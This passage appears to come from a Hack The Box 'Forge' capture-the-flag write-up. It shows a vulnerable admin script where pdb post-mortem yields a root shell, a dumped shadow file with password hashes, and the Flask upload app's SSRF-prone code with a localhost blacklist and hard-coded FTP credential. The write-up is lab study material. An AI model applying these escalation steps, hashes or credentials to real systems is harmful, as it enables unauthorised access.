</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pdb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1025</span><span class=p>,</span> <span class=mi>65535</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SOL_SOCKET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SO_REUSEADDR</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Listening on localhost:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=n>clientsock</span><span class=p>,</span> <span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter the secret passsword: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>clientsock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span> <span class=o>!=</span> <span class=s1>&#39;secretadminpassword&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Wrong password!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Welcome admin!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>What do you wanna do: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[1] View processes</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[2] View free memory</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[3] View listening sockets</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[4] Quit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>option</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>clientsock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;ps aux&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;df&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;ss -lnt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Bye</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pdb</span><span class=o>.</span><span class=n>post_mortem</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>__traceback__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
</span></span></code></pre></div><p>I opened up two session for to the box. For the first session, I triggered the remote management app and to the other I connected to the listener. I triggered an error by supplying an alphabetical character instead of a digit. When pdf was triggered, I spawned a shell</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%206.png data-srcset="/images/forge-htb/Untitled%206.png, /images/forge-htb/Untitled%206.png 1.5x, /images/forge-htb/Untitled%206.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%206.png title=Untitled></p><p>Retrieving the shadow file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root:<span class=nv>$6$Msvc2unlR99fWBAX$boGTeFujypU5XzdRYTBwRdGEUanryagtjUScvHxCfJ</span>.Jt44iwzJhad4rWhXMahebHXA6CSH3Nlr64tpusii6O/:18780:0:99999:7:::
</span></span><span class=line><span class=cl>daemon:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>bin:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>sys:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>sync:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>games:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>man:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>lp:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>mail:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>news:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>uucp:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>proxy:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>www-data:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>backup:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>list:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>irc:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>gnats:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>nobody:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-network:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-resolve:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-timesync:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>messagebus:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>syslog:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>_apt:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>tss:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>uuidd:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>tcpdump:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>landscape:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>pollinate:*:18659:0:99999:7:::
</span></span><span class=line><span class=cl>sshd:*:18766:0:99999:7:::
</span></span><span class=line><span class=cl>systemd-coredump:!!:18766::::::
</span></span><span class=line><span class=cl>user:<span class=nv>$6$w34hTxAL</span>.LRIcWx8<span class=nv>$skVKz6Po0yniq1iLTWR9pz2uIneLDg</span>.70hS9cktguX1ZF48NO.kleINKZxX.u6g9n6TZVDkQVuxb.0qqpgCtG1:18780:0:99999:7:::
</span></span><span class=line><span class=cl>lxd:!:18766::::::
</span></span><span class=line><span class=cl>usbmux:*:18767:0:99999:7:::
</span></span><span class=line><span class=cl>ftp:*:18767:0:99999:7:::
</span></span></code></pre></div><h2 id=post-root class=headerLink><a href=#post-root class=header-mark></a>Post Root</h2><p>I went on to examine how the blocking was being done, there was a list of bad words which would make the request fail it any part of it had a match.</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%207.png data-srcset="/images/forge-htb/Untitled%207.png, /images/forge-htb/Untitled%207.png 1.5x, /images/forge-htb/Untitled%207.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%207.png title=Untitled></p><p>Examining the upload feature that gave us a foothold to the box. Command injection seems possible but I couldn’t manage to trigger. After I looked up what was happening, I saw that shlex was used to escape shell syntax by wrapping our payload in quotes. This therefore prevented command injection.</p><p><img class=lazyload data-src=/images/forge-htb/Untitled%208.png data-srcset="/images/forge-htb/Untitled%208.png, /images/forge-htb/Untitled%208.png 1.5x, /images/forge-htb/Untitled%208.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%208.png title=Untitled></p><p><img class=lazyload data-src=/images/forge-htb/Untitled%209.png data-srcset="/images/forge-htb/Untitled%209.png, /images/forge-htb/Untitled%209.png 1.5x, /images/forge-htb/Untitled%209.png 2x" data-sizes=auto alt=/images/forge-htb/Untitled%209.png title=Untitled></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.</span> <span class=kn>import</span> <span class=n>app</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>werkzeug</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>functools</span> <span class=kn>import</span> <span class=n>wraps</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>shlex</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chars</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span>
</span></span><span class=line><span class=cl><span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;forge.htb&#34;</span><span class=p>,</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;10.10.10.10&#34;</span><span class=p>,</span> <span class=s2>&#34;::1&#34;</span><span class=p>,</span> <span class=s2>&#34;localhost&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=s1>&#39;[0:0:0:0:0:0:0:0]&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>supported_schemas</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;http&#34;</span><span class=p>,</span> <span class=s2>&#34;https&#34;</span><span class=p>,</span> <span class=s2>&#34;ftp&#34;</span><span class=p>,</span> <span class=s2>&#34;ftps&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>navigation</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;class&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;href&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;caption&#34;</span><span class=p>:</span> <span class=s2>&#34;Portal home&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;class&#34;</span><span class=p>:</span> <span class=s2>&#34;align-right margin-right&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;href&#34;</span><span class=p>:</span> <span class=s2>&#34;/announcements&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;caption&#34;</span><span class=p>:</span> <span class=s2>&#34;Announcements&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;class&#34;</span><span class=p>:</span> <span class=s2>&#34;align-right&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;href&#34;</span><span class=p>:</span> <span class=s2>&#34;/upload&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;caption&#34;</span><span class=p>:</span> <span class=s2>&#34;Upload image&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>announce</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;An internal ftp server has been setup with credentials as </span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>user:heightofsecurity123!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;The /upload endpoint now supports ftp, ftps, http and https</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2> protocols for uploading from url.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;The /upload endpoint has been configured for easy scripting</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2> of uploads, and for uploading an image, one can simply pass</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2> a url with ?u=&lt;url&gt;.&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ensure_localhost</span><span class=p>(</span><span class=n>route_handler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nd>@wraps</span><span class=p>(</span><span class=n>route_handler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_ip</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span> <span class=o>==</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>route_handler</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Only localhost is allowed!</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>check_ip</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@ensure_localhost</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/upload&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;POST&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@ensure_localhost</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span> <span class=ow>and</span> <span class=s1>&#39;local&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>upload_local_file</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span> <span class=ow>and</span> <span class=s1>&#39;remote&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;url&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;upload.html&#34;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=n>message</span><span class=o>=</span><span class=s2>&#34;No url defined!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>upload_remote_file</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s2>&#34;GET&#34;</span> <span class=ow>and</span> <span class=s1>&#39;u&#39;</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>upload_from_url</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;upload.html&#34;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_remote_file</span><span class=p>(</span><span class=n>url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>url</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=nb>any</span><span class=p>([</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>supported_schemas</span> <span class=k>if</span> <span class=n>url</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;://&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=n>x</span><span class=p>])):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                       <span class=n>message</span><span class=o>=</span><span class=s2>&#34;Invalid protocol! Supported protocols: http, https, ftp, ftps&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>any</span><span class=p>([</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>blacklist</span> <span class=k>if</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>url</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                       <span class=n>message</span><span class=o>=</span><span class=s2>&#34;URL contains a blacklisted address!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>name</span> <span class=o>=</span> <span class=n>rand</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>name</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>req</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>req</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=n>message</span><span class=o>=</span><span class=s2>&#34;File uploaded successfully to the following url:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://forge.htb/uploads/&#34;</span> <span class=o>+</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=n>message</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;An error occured! Error : </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;upload.html&#34;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=n>message</span><span class=o>=</span><span class=s2>&#34;URL cannot be empty!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rand</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>chars</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_local_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>f</span><span class=o>.</span><span class=n>filename</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;upload.html&#34;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                               <span class=n>message</span><span class=o>=</span><span class=s2>&#34;No file defined!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>rand</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;UPLOAD_FOLDER&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;upload.html&#39;</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=n>message</span><span class=o>=</span><span class=s2>&#34;File uploaded successfully to the following url:&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://forge.htb/uploads/&#34;</span> <span class=o>+</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_from_url</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>u</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>u</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>u</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>u</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;https://&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>upload_remote_file</span><span class=p>(</span><span class=n>u</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>u</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;ftp://&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>u</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;ftps://&#39;</span><span class=p>):</span>
